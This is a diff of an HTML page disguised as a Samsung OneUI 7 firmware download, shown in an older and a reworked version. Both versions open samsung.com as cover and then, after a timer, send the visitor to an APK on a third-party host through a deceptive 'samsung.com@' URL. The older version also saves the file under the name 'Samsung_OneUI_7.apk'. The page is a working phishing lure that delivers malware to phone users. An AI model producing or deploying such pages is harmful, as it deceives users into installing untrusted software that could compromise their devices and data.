@@ -3,46 +3,21 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Samsung OneUI 7 New Update</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      max-width: 600px;
-      margin: 50px auto;
-      padding: 20px;
-      text-align: center;
-    }
-    .btn {
-      background: #1428a0;
-      color: white;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+  <title>Security Update</title>
 </head>
 <body>
-  <h2>Samsung OneUI 7.0 Update</h2>
-  <p>Download the latest OneUI 7.0 firmware</p>
-  
-  <button class="btn" onclick="downloadUpdate()">Download Firmware</button>
+  <button onclick="triggerDownload()">Download Samsung OneUI 7</button>
 
   <script>
-    function downloadUpdate() {
-      // Open Samsung website first for visual context
-      const samsungWindow = window.open('https://www.samsung.com', 'samsungFrame');
+    function triggerDownload() {
+      // Open legitimate site first
+      const newWindow = window.open('https://www.samsung.com', 'samsung');
       
-      // After delay, trigger download with spoofed URL and custom filename
+      // Trigger download after delay
       setTimeout(() => {
-        const a = document.createElement('a');
-        a.href = 'https://www.samsung.com@ryynx88.github.io/chy.apk';
-        a.download = 'Samsung_OneUI_7.apk';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      }, 5000);
+        const downloadUrl = "https://www.samsung.com@ryynx88.github.io/chy.apk";
+        newWindow.location.href = downloadUrl;
+      }, 2000);
     }
   </script>
 </body>
